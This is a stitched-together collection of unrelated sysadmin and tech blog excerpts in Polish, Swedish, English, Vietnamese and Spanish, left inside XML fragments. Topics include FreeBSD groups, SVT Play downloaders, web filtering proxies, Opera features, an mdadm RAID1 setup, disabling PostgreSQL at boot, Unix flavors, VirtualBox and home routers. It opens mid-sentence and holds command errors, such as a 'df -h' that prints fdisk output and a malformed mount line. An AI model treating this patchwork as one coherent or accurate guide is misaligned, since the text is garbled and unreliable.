linia zawiera 4 wartości. Pierwszą z nich jest nazwa grupy. Grupy zaleca się nazywać poprzez używanie słów który w większym stopniu określą do czego mamy tą grupę, lepsze to niż nazwać grupe od root zamiast wheel to nazwać ją np. unicorns, a później zastanawiać się od czego ona jest. Raczej nikt nie ma tak dobrej pamięci, że za kilka miesięcy będzie pamiętał od czego jest dana grupa, więc zalecam rozsądne nadawanie nazw grupą. Druga wartość opisuje zaszyfrowane hasło grupy. Hasła grupy mogą powodować szkodliwe praktyki łamania ich, dlatego większość nowoczesnych Unix'ów ich po prostu nie obsługuje. Jak i wiele podobnych rzeczy, to pole niestety zawsze tam będzie i nic z nim nie zrobimy, zamiast zostawić to pole puste lepiej użyć (*) jako symbolu zastępczego, przynajmniej wygląda jakby tam było coś zaszyfrowanego lub zamaskowanego. Trzecie pole to nic innego jak unikalny numer grupy, czyli tak zwane GID. Wiele programów w FreeBSD nadaje GID na np. porcie na którym pracuje dana usługa np. bind ma GID  53 i jest od DNS. Zawartość /etc/groupe jest uporządkowana w kolejności rosnącej GID. Ostania wartość to nic innego jak lista osób w danej grupie. Jeśli zapragniemy dodać jakiegoś usera do grupy to można to zrobić tutaj, dodając więcej niż jednego użytkownika do grupy oddzielamy nazwy przecinkami! Tworzenie grup Jeśli zapragniemy utworzyć grupę dla jakiegoś celu, najpierw musimy znaleźć dla niej unikalny numer GID, najlepiej taki który już nie jest zajęty przez żaden program w systemie. My na przykład tworzymy grupę wwwusers, która będzie od zarządzania plikami www. GID najlepiej obrać bliskie GID od grupy o podobnym GID np. www ma GID 80 to my możemy dać wwwusers GID 81. Warto też zaznaczyć, że czasami nie ma potrzeby tworzenia kopi grup już istniejących jak przykład powyżej, wystarczy dopisać userów np.:  www:*:80:janek,franek,marek  Po edycji /etc/group, dobrym pomysłem jest sprawdzenie czy nie popełniliśmy błędu. W takim wypadku FreeBSD posiada komendę:  # chkgrp  Która sprawdza czy w składni nie wkradł nam się błąd. Jeśli wszystko przebiegło pomyślnie to możemy grupie nadać prawo do edycji folderów/plików komendą:  #  chgrp  Żeby zobaczyć istniejących właścicieli i grupy jak i uprawnienia plików należy wpisać komendę:  # ls -l  Wielu nowych administratorów zwraca uwagę na właściciela pliku, ale już nie zwraca uwagę na grupę. Po wpisaniu komendy np. pojawi się nam:     # ls -l total 2 -rw-------  1 root  wheel   455 Sep 03 22:04 plik1 -rwxrwxr--  1 root  wheel    67 Sep 03 22:05 plik2 #  W tym wypadku plik1 może być tylko odczytany i zmieniany przez root'a. Plik2 może być czytane przez root'a jak i każdego innego użytkownika z grupy wheel. Jeśli jesteś w grupie wheel, nie musisz być root'em żeby edytować lub odczytać plik2. Wystarczy otworzyć edytor i zmieniać! Źródło: wiedza własna + handbookPozdrawiam Vashezz]]></summary>

  <summary><![CDATA[Dags att ännu en gång försöka röja det där missförståndet ur vägen. Erik Hedin, som presenterar sig som "trebarnspappa som startade och numera konceptutvecklar SVT Play (föräldraledig till maj 2013)", lyckades tidigare i dag skriva så här på Twitter: Tv-piraterna har tydligen problem med nya SVT Play planka.huggpunkt.org/topic/68/ — Erik Hedin (@HedinErik) October 3, 2012 Som ni ser länkar han till ett inlägg på diskussionsforumet, där jag förklarar varför SVT Plays nya strömmar inte ännu fungerar med Huggpunkt VHS. När man lägger fritid på att utveckla lagliga alternativ till illegal fildelning är det en smula nedslående att kallas för TV-pirat, särskilt som jag aktivt tagit avstånd från piratkopiering, så jag känner ett visst behov av att svara. Visserligen har jag fortfarande ett Twitter-konto eller två och skulle kunna svara där, men saker som ryms i en tweet är sällan värda att säga alls, och om man ändå försöker ser man bara dum ut. (Att varenda kotte som sysslar med marknadsföring, media eller politik har Twitter är säkert helt icke-relaterat.) Jag svarar här i stället. Någon som läser bloggen kan ju pinga honom, om det känns värt besväret. Av framför allt tre skäl är Erik Hedins kviddevitt sannolikt sprunget ur häcken.  
Det här har ingenting med piratkopiering att göra.
Problemet är inte nya SVT Play, utan de nya strömformaten.
"TV-piraterna" har inga problem, utan det är vi andra.
Nedan förklarar jag mera ingående vad som ligger bakom de här tre punkterna. 1. Det har ingenting med piratkopiering att göraDe två program som foruminlägget Erik Hedin länkat till handlar om är Huggpunkt VHS och SVTPlay.sh. (Jag nämner visserligen även PiratePlay i inlägget, som fyller ungefär samma funktioner, men vare sig jag eller inlägget har egentligen något med PiratePlay att göra. Detta utgår jag från att Erik Hedin förstått, eftersom han, precis som alla andra twittrare, aldrig skulle uttala sig utan att först ha satt sig in i ämnet.) Grejen är att vare sig H.VHS eller SVTPlay.sh lär vara särskilt intressanta för personer som sysslar med illegal fildelning. De är helt enkelt vare sig nödvändiga eller särskilt smidiga i den typen av situationer. Detta förklaras kanske bäst genom att säga något om vilka programmens respektive syften och målgrupper faktiskt är. SVTPlay.sh är ett skalskript som tillkommit för att SVT Play bara fungerar om man har Flash, vilket inte är någon självklarhet. Den första versionen av skriptet skrev jag för flera år sedan för att slippa allt krångel med HTML-kod varje gång jag ville se något program på datorn. Flash finns nämligen inte för OpenBSD, och jag har ingen lust att byta operativsystem bara för att komma åt public service-sändningar.Sveriges Radio ska för övrigt ha en eloge. När de för några år sedan lanserade sin nya sajt blev det krångligare för oss utan Flash, vilket jag skrev till dem om. De besvarade kritiken genom att göra det enklare än någonsin tidigare att komma åt mediaströmmarna. Det var lysande! Målgruppen är framför allt unix-användare. Skriptet har en närmast överdriven mängd parametrar för att kunna användas i så många olika situationer som möjligt, exempelvis plugin för webbläsare eller "smarta" TV-apparater. Huggpunkt VHS har en helt annan målgrupp. Även om programmet ger åtkomst till videor på SVT Play och en handfull andra sajter även på plattformar utan Flash, så är huvudsyftet att göra nedladdning för privat bruk enkelt. Jag inser att det där med "privat bruk" låter litet suspekt, eftersom det är en fras som mellan varven missbrukas. Därför är det bäst att åtminstone ge några exempel på hur programmet faktiskt används: 
Hämta program på datorn och föra över dem till exempelvis en iPad inför en längre bil- eller tågresa. Mobilnätet har inte perfekt täckning, särskilt inte på tåg.
Se program i bättre kvalitet än vad som går att strömma. Jag bor själv i en liten by och har inte bandbredd nog för de tjockaste strömmarna på SVT eller TV4 Play.
Spara program man vill se men inte har tid att se förrän de försvunnit från sajten.
Ladda ned program som bara visas i Sverige, för att någon närstående som bor i utlandet ska kunna se dem.
Samtliga användningsområden jag beskrivit ovan är lagliga. Det är inte frågan om att de är lagliga enbart för att ingen förbjudit dem, utan lagen är särskilt utformad för att sådana här användningsområden ska vara tillåtna. Syftet med den privatkopieringsersättning vi betalar ovanpå priset för olika datamedia är just att ersätta upphovsrättsinnehavare för sådan här nedladdning och kopiering för privat bruk. De allra flesta som använder den här typen av program är bara intresserade av att se videorna utan att behöva strömma dem samtidigt, och lagen är utformad för att det ska vara tillåtet att använda sajterna på det sättet. Därför har det här inte med piratkopiering att göra. Lättanvända och lagliga alternativ gör snarare att efterfrågan på piratkopior minskar. (Vilket väl är bra?) 2. Problemet är inte nya SVT Play utan strömformatenDet inlägg i diskussionsforumet som Erik Hedin länkade till förklarar egentligen det mesta bakom den här punkten, men en sak är värd att tillägga: SVT Plays nya webbsajt, som lanserades i början av juni, är faktiskt mycket enklare att interagera programmatiskt med än den tidigare versionen. Det är inte nya SVT Play som är problemet, utan Adobes och Apples nya strömformat. Problemet är dessutom inte formaten i sig, utan att öppen källkod-världen inte hunnit ifatt ännu. Ska man tvunget ha något att klaga på SVT över, så är det i så fall att de använder Flash. Flash är dåligt och onödigt. Youtube har fungerat utan Flash rätt länge nu. 3. Det är inte "TV-piraterna" som har problemRent tekniskt finns det inga större hinder att kopiera videoströmmarna. Om man har tillräcklig kompetens och motivation att sprida videor på torrentsajter, så har man också tillräcklig kompetens och motivation att använda de krångligare lösningarna på nedladdningsproblemen. I de fall där strömmarna inte direkt går att spara med AdobeHDS.php eller FFmpeg kan man helt sonika köra ett skärmfångstprogram som bara spelar in vad som visas på skärmen. Visserligen tar det litet längre tid, och man måste krångla en del för att inte få antingen gigantiska videofiler eller märkbart sämre kvalitet, men det är som sagt bara en fråga om motivation och kunnande. Och ingen tror väl att det där är två egenskaper som dem som lägger upp grejor på torrent-trackers saknar? Piratkopierarna har alltså inte några större problem med SVT Play – eller någon av de andra Play-sajterna. I stället hamnar vi i slutändan (åter) i en situation där TV-programmen inte går att spara på de sätt som är lagliga, eller ens att se på vissa plattformar, men de finns på Pirate Bay. Perfekt.]]></summary>

It does not purely filter based on a list of  banned websites DansGuardian is designed to be as completely flexible  and allows you to tailor the filtering to your exact needs. The default settings are geared towards what a primary school might want but  DansGuardian puts you in control of what you want to block.  You can also run this software on a server and filter Windows clients.   Product 2:SquidGuard/Squid SquidGuard is a URL redirector used to use blacklists with the proxy software Known as ''Squid''.There are 2 big advantages to using this software:It's Fast, and It's free to use. The software is also fast, Very flexible, easily installed and portable. This software can be used to:Limit  the web access for some users to a list of accepted/well known web servers and/or URL's only.Block access to some listed or blacklisted web server's and  URL's for some users.Have different access rules for certain times/days of the week.Have different rules for different usergroupsRedirect unregistered user to a registration form to join a group,  or access certain areas of a website which are restricted to Non-members In conclusion: If I were to choose 1 of the Proxy devices, I would go with ''SquidGuard'' Over ''DansGuardian'' As I feel that SquidGuard has more features than DansGuardian, and seems to be a lot easier to use and more  simplistic.]]></summary>

  <summary><![CDATA[Download Opera 10.70 Build 9047 BetaOpera 10.70 Build 9047 Beta  brings you an interesting and impressive opportunity to discover the new standard in Web browsing. Download Opera today to get the fastest and most powerful Web browser available and make the most of your time online. 
Opera is a standards-compliant Web browser for Mac OS X, Unix, Windows, QNX, Symbian, OpenBSD and several other operating systems.  Opera gives you a better Internet experience with its combination of speed, unique features, and keyboard shortcuts.  
Major Features: 
Popular features 
Tab stacking 

Dragging one tab over another allows you to create groups of tabs. Now you can keep dozens of webpages open, organized and under control. 

Personalize 
Customize your browser 

You can add, remove or reposition buttons and toolbars or change the entire layout of the browser. It is easy to do… or undo. 

Access bookmarks instantly 
The convenient bookmarks bar keeps commonly visited sites and bookmark folders in front of you at all times, allowing instant access. You can enable this toolbar by selecting Opera menu -> Toolbars -> Bookmarks Bar. 
Choose your look and layout 

Opera’s vibrant user community has created many beautiful skins and setups for you to try, so you can have a customized look for your browser. 

Create your own shortcuts 

Opera offers many ways to perform browser actions, and you can also customize your own keyboard shortcuts, mouse gestures and more. 

Tabs 
Look inside tabs 

When you hover the mouse pointer over a tab, a preview shows you the content of that page. When you stack tabs, hovering over a stack also shows a preview of the tabs within, and you may select the tab you want to use. 

Re-open tabs you closed 

With Closed Tabs, you can open tabs that you accidentally closed or website pop-ups that Opera blocked. 

Protect a tab from closing 

By right-clicking a tab, you can pin it to prevent it from being closed by accident. Pinned tabs take up minimal space and are automatically moved to the left of other tabs to make them easy to find. 

Get a better view of tabs 

Visual tabs show a small thumbnail for each website, in addition to the page title and icon. You can drag the tab bar to the desired height to adjust the thumbnail size accordingly. 

Save sets of tabs 

You can save your open tabs as a “session” and load it later on to open these same pages. You can have multiple sessions and load each one based on what you are doing at a certain time. 

Productivity 
Stay in control of downloads 

Download files more quickly. As soon as you click a file to save it, Opera starts downloading it, so there is no wasted time. Pause and resume downloads with the push of a button, and choose multiple files to download simultaneously. 

Follow your favorite feeds 

Subscribing to newsfeeds with Opera Mail is simple. Just click the RSS link in the address field, click “Subscribe”, and the feed will display under “Newsfeeds” at the bottom of your Mail panel. Now, you can get your RSS feeds right in the browser without using a separate program. 

Keep your spelling in check 

The spell checker in Opera shows a red line under misspelled words anywhere you can enter text on a webpage. Corrections can be chosen by right-clicking the misspelled word. 

Eliminate distractions 

You can block images, pop-ups and plug-ins that you do not want to see. Right-click a page, choose “Block Content” and click annoying elements to disable them selectively. In Opera, smart pop-up blocking is turned on by default. 

Manage bookmarks efficiently 

Give your bookmarks easy-to-remember names or group them into folders to help manage your bookmarks as your collection grows. 

Load plug-ins only when needed 

You can choose to have plug-ins such as Flash and Silverlight load content only when clicked. This is helpful to speed up browsing on computers that have difficulty handling lots of plug-in content. 

Use convenient widget apps 

Many Opera Widgets are available to provide handy functions such as showing the weather, quickly looking up information or providing entertainment and games. Opera Widgets now run directly on the desktop, so they keep running even if you close your browser. 

Download using BitTorrent 

Support for BitTorrent is built in to Opera so you can download torrents without the need for a separate application. You can even monitor the progress of large torrent downloads with Opera’s downloads panel. 

Search 
Search from the address field 

Save time by typing your search query directly into the address field. You can also customize this feature by choosing the search engine you prefer. 

Get suggestions as you search 

Search suggestions predict queries as you type, making searching quicker and easier. Google search predictions are now built into Opera, along with Wikipedia, Bing and Yandex suggestions. These are displayed when using the search field or when using search keywords in the address field. For example, to see Google’s search predictions, type “g search words” in the address field. 

Use any search engine instantly 

It is easy to use your favorite search engine whenever you want—from the search field, the address field or even the context menu. You can also add any search engine. Simply right-click in the search field of a search engine’s website and select “Create Search”. 

Find what you need in webpages 

“Find in page” is brilliant in Opera. All matching results are highlighted, so they are clearly visible. You can fine-tune your search to match all the text, just the whole word or only the links or the page. This feature can be accessed from keyboard shortcuts such as [.] (period) for text and [,] (comma) for links. 

Get back to visited pages easily 

By typing in the address field, you can search through items in your history and bookmarks. Results will show that match actual page content, making it easy to find pages that you have visited. Deleting pages from your history can also be done directly from this history list. 

Latest Technologies 
The fastest JavaScript engine 

The Carakan JavaScript engine has been further enhanced to run more quickly than ever! This makes Opera 11 the fastest browser on Earth in many performance tests. Even complex webpages load and run with lightning speed. 

Support for the the latest HTML5 

With the latest Opera Presto rendering engine and its improved support for HTML5 and CSS3, websites using the latest web standards are no problem for Opera. Opera 11 supports new technologies such as Web Sockets and server-sent events so sophisticated web apps and multiplayer games can be supported in Opera. 

Smooth and fast graphics 

Everything in Opera is drawn on your screen using Opera’s new high-performance Vega graphics library. This enables super fast and smooth graphics, in everything from tab switching to animation on webpages. 

Support for Geolocation 

You can now share your location with geolocation-supported websites such as Google Maps. Rest assured that your privacy is a top priority – you will always be prompted before sharing your location. 

Security and Privacy 
Be safe on the Web 

Opera features up-to-the-minute information from leading security agencies on exploits, viruses and phishing scams. When you visit sites on the Web, Opera checks this data in real time and warns you when a site is identified as dangerous. In addition, Opera supports Extended Validation certificates (EV) to provide added assurance and trust for secure websites. 

Keep your browsing private 

Using a private tab or window ensures that evidence of your browsing history is removed as soon as the tab or window is closed. Now, it is safer to do your banking from a public computer or easier to plan that surprise vacation. 

See your security on websites 

An enhanced address field makes it easy to stay safe on the Web. The complexity of long addresses is hidden to make it clear which site you are visiting. A colored badge also indicates the quality of encryption that is used; clicking it gives you detailed information about the site. 

Control website cookies 

Opera allows you to choose which cookies you accept or reject. For example, you can allow for different set-ups for different servers. 

Stay up to date 

Opera 11 makes it easy to have the latest version of not just the browser, but any extensions and Opera Unite applications you are using. You can have completely automatic updates or to be notified when an update is ready for you install. As always with Opera, it is your choice.

  <title><![CDATA[Tạo RAID1 cho đĩa cứng mới thông qua SSH]]></title>
  <summary><![CDATA[Các bước sau đây là cách của tôi vào việc cung cấp RAID1 (nhân đôi đĩa) thông qua SSH trong máy chủ của tôi. Những gì chúng ta cần là 2 HDD mới mà có cùng một không gian đĩa và đã được cắm vào máy chủ. 
Các biến như sau: 
OS = CentOS 5.6 64bit 
/dev/sdb = new hard disk #1 
/dev/sdc = new hard disk #2 
/dev/sdb1 = partition 1 hard disk #1 
/dev/sdc1 = partition 1 hard disk #2 
/dev/md1 = RAID1 partition after both disk mirrored 
/home2 = mount point for RAID1 
1. Xem lại thông tin về tổng số không gian và không gian có sẵn trên một hệ thống tập tin: 
[root@centos ~] df -h
Filesystem            Size  Used Avail Use% Mounted on
/dev/mapper/VolGroup00-LogVol00
47G  3.3G   41G   8% /
/dev/sda1              99M   13M   81M  14% /boot
tmpfs                 249M     0  249M   0% /dev/shm
2. Xem lại thông tin đĩa được phát hiện trong hệ thống. Hãy chắc chắn rằng /dev/sdb và /dev/sdc trong danh sách: 
[root@centos ~] fdisk -l

Disk /dev/sda: 53.6 GB, 53687091200 bytes
255 heads, 63 sectors/track, 6527 cylinders
Units = cylinders of 16065 * 512 = 8225280 bytes

Device Boot      Start         End      Blocks   Id  System
/dev/sda1   *           1          13      104391   83  Linux
/dev/sda2              14        6527    52323705   8e  Linux LVM

Disk /dev/sdb: 21.4 GB, 21474836480 bytes
255 heads, 63 sectors/track, 2610 cylinders
Units = cylinders of 16065 * 512 = 8225280 bytes

Disk /dev/sdb doesn't contain a valid partition table

Disk /dev/sdc: 21.4 GB, 21474836480 bytes
255 heads, 63 sectors/track, 2610 cylinders
Units = cylinders of 16065 * 512 = 8225280 bytes

Disk /dev/sdc doesn't contain a valid partition table
3. Cài đặt mdadm thông qua yum: 
# yum install mdadm -y 
4. Cho phép tạo phân vùng Linux raid autodetect ‘cho đĩa cứng đầu tiên, / dev / sdb. Trong lệnh sau đây, bạn có thể nhập ‘m’ để xem trợ giúp. Tôi sẽ chỉ tiến hành với phân vùng: 
[root@centos ~] fdisk /dev/sdb

Command (m for help): w
The partition table has been altered!
6. Thực hiện trên cả hai đĩa cứng. Bây giờ chúng ta thử xem xét lại các định dạng đĩa như sau. Hãy chắc chắn rằng chúng tôi đã tạo ra các phân vùng chính xác đó là: 
[root@centos ~] df -h
......................
Disk /dev/sdb: 21.4 GB, 21474836480 bytes
255 heads, 63 sectors/track, 2610 cylinders
Units = cylinders of 16065 * 512 = 8225280 bytes

Device Boot      Start         End      Blocks   Id  System
/dev/sdb1               1        2610    20964793+  fd  Linux raid autodetect

Disk /dev/sdc: 21.4 GB, 21474836480 bytes
255 heads, 63 sectors/track, 2610 cylinders
Units = cylinders of 16065 * 512 = 8225280 bytes

Device Boot      Start         End      Blocks   Id  System
/dev/sdc1               1        2610    20964793+  fd  Linux raid autodetect
7. Bây giờ thời gian của mình để tạo ra các mảng RAID1 bằng cách sử dụng mdadm. –level=1 có nghĩa là chúng ta đang tạo RAID1 ,–raid-devices có nghĩa là chúng tôi đang sử dụng 2 đĩa cứng theo quy định sau đó: 
[root@centos ~] mdadm --create /dev/md1 --level=1 --raid-devices=2 /dev/sdb1 /dev/sdc1
8. Sau khi thực hiện, RAID sẽ bắt đầu resync. Bạn có thể sử dụng lệnh sau để kiểm tra sự đồng bộ: 
[root@centos ~] watch 'cat /proc/mdstat'

Personalities : [raid1]
md1 : active raid1 sdc1[1] sdb1[0]
20964672 blocks [2/2] [UU]
[============>........]  resync = 61.9% (12990336/20964672) finish=0.6min speed=205479K/sec

unused devices:
9. Sau khi hoàn thành, chúng ta cần để tạo ra hệ thống tập tin để phân vùng RAID1. Trong trường hợp này, chúng tôi sẽ sử dụng hệ thống tập tin ext3: 
[root@centos ~] mkfs.ext3 /dev/md1
mke2fs 1.39 (29-May-2006)
Filesystem label=
OS type: Linux
Block size=4096 (log=2)
Fragment size=4096 (log=2)
2621440 inodes, 5241168 blocks
262058 blocks (5.00%) reserved for the super user
First data block=0
Maximum filesystem blocks=4294967296
160 block groups
32768 blocks per group, 32768 fragments per group
16384 inodes per group
Superblock backups stored on blocks:
32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208,
4096000

Writing inode tables: done
Creating journal (32768 blocks): done
Writing superblocks and filesystem accounting information:
10. Cho phép gắn kết nó. Nhưng trước đó, chắc chắn rằng thư mục được tồn tại: 
[root@centos ~] mkdir /home2
[root@centos ~] mount /dev/md1 on /home2
11. Sửa đổi /etc/fstab bằng cách thêm dòng sau đây để phân vùng mới của bạn được gắn kết tự động sau khi khởi động lại: 
# vi /etc/fstab 
/dev/md1                /home2                  ext3    defaults        1 2

  <title><![CDATA[Eliminar PostgreSQL del arranque]]></title>
  <summary><![CDATA[Hace unos días instale un servidor con Debian y por comodidad dejé que algunos paquetes se instalaran por defecto. Mejor o no, esa no es la cuestión. Ahora tengo paquetes que son servicios, que están instalados en mi sistema y que quiero evitar que se ejecuten en cada arranque. No quiero eliminarlo, es posible que en un futuro desee usarlos. 
 
Sí, en cada inicio podría detenerlo, incluso podría poner en el cron una tarea que lo hiciera de manera automática, pero eso me parece “una chapuza” pudiéndolo hacer de una manera más limpia. A modo de ejemplo, veremos en esta entrada cómo detener el servicio de PostgreSQL. Si quisiéramos hacer manualmente bastaría con: 
root@6581-Server:~# /etc/init.d/postgresql stop 
Nos podría servir, pero no es lo que queremos. Para eliminar completamente PostgreSQL del arranque nos serviremos de chkconfig8. Lo primero que vamos a hacer es instalarlo, para ello (y como superusuario): 
root@6581-Server:~# apt-get install chkconfig 
Para ejecutarlo, es sencillo. El paquete se nombra igual que el programa (también como superusuario): 
root@6581-Server:~# chkconfig 
Con esto, y sin ningún parámetro, obtenemos la lista de servicios y su estado: 
acpid on 
apache2 on 
atd on 
bootlogd on 
bootlogs on 
bootmisc.sh on 
checkfs.sh on 
checkroot.sh on 
console-setup on 
cron on 
dbus on 
exim4 on 
hostname.sh on 
hwclock.sh on 
hwclockfirst.sh on 
ifupdown on 
ifupdown-clean on 
kbd on 
keyboard-setup on 
killprocs on 
module-init-tools on 
mountall-bootclean.sh on 
mountall.sh on 
mountdevsubfs.sh on 
mountkernfs.sh on 
mountnfs-bootclean.sh on 
mountnfs.sh on 
mountoverflowtmp on 
mtab.sh on 
mysql on 
networking on 
nfs-common on 
nfs-kernel-server on 
openbsd-inetd on 
portmap on 
postgresql on 
procps on 
rc.local on 
rcS off 
rmnologin on 
rsyslog on 
samba on 
sendsigs off 
smartmontools on 
ssh on 
stop-bootlogd on 
stop-bootlogd-single on 
udev on 
udev-mtab on 
umountfs off 
umountnfs.sh off 
umountroot off 
urandom on 
virtualbox-ose-guest-utils on 
winbind on 
x11-common on 
He resaltado el servicio que buscábamos, ¿Cómo ponerlo a off? Muy fácil, fijaros cómo continúo el ejemplo: 
root@6581-Server:~# chkconfig postgresql off 
Volvemos a consultarlo: 
root@6581-Server:~# chkconfig postgresql 
postgresql off 
y hemos terminado. Para ver los cambios evidentemente tendremos que reiniciar, no hay otra. 
En la siguiente entrega veremos algunos aspectos más complejos mediantes los cuales tendremos mayor control sobre el arranque de servicios.]]></summary>

  <title><![CDATA[UNIX Flavors (Distributions)]]></title>
  <summary><![CDATA[Which operating system is best for web hosting?  
It seemed a simple enough topic, or so this web hosting novice thought. So I went through countless of sites in search of the answer and came up with a list of Web Hosting Operating Systems to choose from. Whereupon I concluded that there really wasn’t a system that would prove ‘best’ for all. It was, for the most part, simply a matter of needs, and of course, of preference, both from the web host’s and the web master’s points of view.  
That takes care of that! Right? Well, not quite. I realized, in the course of my research, that from this list, another ‘list’ begged to be made. A list, that seemed necessary if one were to make an informed choice when it comes to operating systems.  
This list, of course, is that of the many Unix ‘flavors’ available in the market. Unless you’re an expert, or simply a fanatic, chances are the concept of Unix having ‘flavors’ came as a surprise. Who knew flavors could apply to things other than ice cream, or food for that matter?  
So what exactly is a Unix flavor?  
this blog  defines it as an implementation of Unix, with each flavor, designed to work with different types of hardware, and having its own unique commands or features. The UGU site provides one of the more comprehensive lists of Unix flavors, but for those who don’t feel like going though all those links, below is an overview of the more popular ones. 
Flavors that are available commercially (read: sold) include: 
Solaris – Sun Microsystems’ implementation, of which there are different kinds available: these are Solaris OS for SPARC platforms, Solaris OS for x86 platforms, and Trusted Solaris for both SPARC & x86 platforms; the latest version is Solaris 10 OS 
AIX – short for Advanced Interactive eXecutive; IBM’s implementation, the latest release of which, is the AIX 5L version 5.2. 
SCO UnixWare and OpenServer – are implementations derived from the original AT&T Unix® source code acquired by the Santa Cruz Operation Inc. from Novell, and later on bought by Caldera Systems; the latest versions are UnixWare 7.1.3 and OpenServer 5.0.7 
BSD/OS – the Berkeley Software Distribution (BSD) Unix implementation from Wind River; its latest version is the BSD/OS 5.1 Internet Server Edition 
IRIX – the proprietary version of Unix from Silicon Graphics Inc.; the latest release of which is IRIX 6.5 
HP-UX – short for Hewlett-Packard UniX; the latest version is the HP-UX 11i 
Tru64 UNIX – the Unix operating environment for HP AlphaServer systems; Tru64 UNIX v5.1B-1 is the latest version 
Mac OS – Mac operating system from Apple Computer Inc. having a Unix core; the latest version is the Mac OS X Panther 
Flavors that are available for free, include: 
FreeBSD – derived from BSD, it is an advanced OS for x86 compatible AMD64, Alpha, IA-64, PC-98 and UltraSPARC® architectures; the latest versions are FreeBSD 5.2.1 (New Technology Release) and the FreeBSD 4.9 (Production Release) 
NetBSD – Unix-like OS derived from BSD and developed by The NetBSD Project; it is shipped under a BSD license and the latest release is NetBSD 1.6.2 
OpenBSD – multi-platform 4.4BSD-based Unix-like OS from The OpenBSD project; its latest release is OpenBSD 3.4 
Linux — a Unix-type OS originally created by Linus Torvalds, the source code of which is available freely and open for development under GNU General Public License; there are numerous Linux distributions available 
A more detailed discussion of these flavors will be provided in future postings, so do come back soon. 
NOTES:  
Free in this case means that the software is free (to use), but does not necessarily mean that users won’t shell out money to get their own copy(ies). Suppliers may charge a nominal fee for materials used to copy/distribute these (i.e. CDs) and for shipping (if applicable). 
BSD license simply put means that users are allowed to develop products based on NetBSD without the changes having to be made public 
Although Linux has traditionally been freely available, the ongoing case by SCO against IBM and the rest of the Linux community might change this. A more detailed posting will be made on this topic in the coming days.]]></summary>

———————————————————————————————— 
Oracle VM VirtualBox is an industrial-strength open source virtualisation tool that makes it easy to create virtual machines (VMs), simulated computers that run on your PC but act as though they were separate systems. It’s a powerful capability that has many different applications. 
If you’d like a closer look at Windows 7 before you upgrade, for instance, then you could install Microsoft’s latest in a VM, then access it in a window on your XP or Vista desktop. 
Or maybe you’ve upgraded to Windows 7 and find a favourite old app doesn’t work any more? Create a Windows XP VM and you might be able to run it again. 
VirtualBox can also be a useful security tool: if you download and test apps in a VM, then any malware you might encounter will be isolated from your main system. 
And it’s the perfect choice if you want to try out another operating system with the minimum of hassle. Right now you can install Google Chrome OS, all the mainstream Linux variants (2.4 and 2.6), OpenBSD, OS/2, ReactOS, SkyOS, DOS, and just about every version of Windows there’s ever been. (Of course you’ll need to have the system discs to hand.) 
New additions to VirtualBox 4 include an interface redesign, making it easier to view and manage your virtual machines. VM displays can now be scaled, so you can reduce a window size by half (for instance) and still see everything that’s going on. The ability to limit a VM’s CPU and IO time means the program will be less of a drain on your system’s resources, and there are a host of other performance optimisations and bug fixes available. 
VirtualBox 4.2 is a major upgrade with these changes: 
Increased efficiency: Making it easier and more efficient to manage larger numbers of similar virtual machines, Oracle VM VirtualBox 4.2′s new VM Group feature enables grouping of VMs. 
More flexible VM startup options: VMs that don’t need user interaction can now be started within Oracle VM VirtualBox the same way as standard VMs. 
Networking improvements: With an increase in the maximum number of network cards per VM from eight to 36, Oracle VM VirtualBox 4.2 can be used to simulate complex networks without the need to procure costly hardware. 
New platform support: Oracle VM VirtualBox 4.2 adds support for Windows 8, Mac OS X 10.8 “Mountain Lion,” and Oracle Linux 6.3. 
Verdict: 
This professional quality virtualization package must be one of the most powerful open source tools around

  <title><![CDATA[Router woes the search]]></title>
  <summary><![CDATA[I recently wrote about my router woes, this is the second part describing my search for a solution. 
The search took me through several twists and turns through off the shelf equipment with custom firmware through Atom based routers and on to my current solution….. 
 
Recap on features I need and the features I want. 
Needs 

Low power usage
Wifi
IPv4 State full packet inspection firewall
Web UI
VPN Passthrough
Must be able to route / firewall a minimum of 20mb/s connection speed (Preferably more for future needs

Wants 

IPv6 firewall
IPv6 6 to 4 tunnel adapter
OpenVPN endpoint and server
Flexible routing
Quality of service so I can prioritise my traffic
Limiters so I can enforce bandwidth limits
Separation of my networks at home

I know that this is a big list and follows a brief story of my search. 
Tomato/DDWRT on hardware that works!
A work colleague suggested that I take a look at this interesting website aimed at running open source firmware on off the shelf hardware. To be more specific that I look at OpenWRT frimware on a Netgear WNR3500L. 
This has some merit the router is now relatively cheap with a new one on Amazon costing £70 and second hand examples on Ebay for under £30! 
The DDWRT firmware doesn’t do all the things on my list but TomatoVPN might. However after the experience I had with the Firmware on my Linksys (Cisco WRT150N) I decided to keep looking. 
Full on PFSense system
I have a lot of experience with enterprise firewalls having worked with Cisco, Checkpoint, Vanilla OpenBSD, Linux firewalls of many varieties and my personal favorite PFSense. I chose to take a look at how much it would cost to go with PFSense at home as the others mentioned here either don’t have the features easily accessible or cost a lot more than I am prepared to pay for my cable firewall. 
With PFsense you have a big hardware choice, you can go for a low power embedded system running an AMD Geode CPU using 5 -15 watts or a full on x86 system. First I looked at the low power kit made by PCEngines. 
The ALIX systems are pretty capable systems running PFSense however looking at the PFSense forums I found that they would be able to handle 20mb/s of VPN throughput using the AES offload engine but probably wouldnt be able to route much over 50mb/s meaning future expansion is limited. To add to this the cost of an ALIX system is roughly £150+ and for that I could build an Atom system, Couldn’t I? 
Atom systems running PFSense would easily be able to cope with my throughput requirements but the power usage might be too high. Probably less than 60 watts but that is still too much. However I did manage to price up an Atom system on Mini-itx.com for under £200! 
Price competition leads to discovery
After looking for a few days at prices and weighing up the pro’s and con’s of each PFSense solution I was set to make a purchase and went off looking for the very best price I could find. This lead me to the linitx.com website. Good prices, nice site, good selection including a brand I had never heard of? 
MikroTik and Router OS 
I have not see or heard of the Latvian company MikroTik before but curiosity got the better of me and I spent my £39.60 on a basic MikroTik RouterBoard 951-2n which arrive 2 days later in a brown cardboard box. 
  
How did it go? thats for the next article…..

